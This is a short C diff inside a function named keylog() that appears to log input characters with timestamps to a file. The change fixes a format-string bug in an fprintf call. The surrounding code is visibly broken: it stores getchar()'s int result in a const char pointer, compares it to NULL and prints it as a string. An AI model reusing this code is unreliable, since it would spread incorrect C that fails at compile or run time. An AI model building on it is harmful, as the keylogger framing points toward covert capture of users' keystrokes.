@@ -11,7 +11,7 @@ int keylog()
     const char *a = getchar();
     
     if(a != NULL)
-        fprintf(fPtr, a);
+        fprintf(fPtr, "%s", a); // Add %s to print the string correctly
     
     time_t now = time(NULL);
     struct tm *tm_struct = localtime(&now);
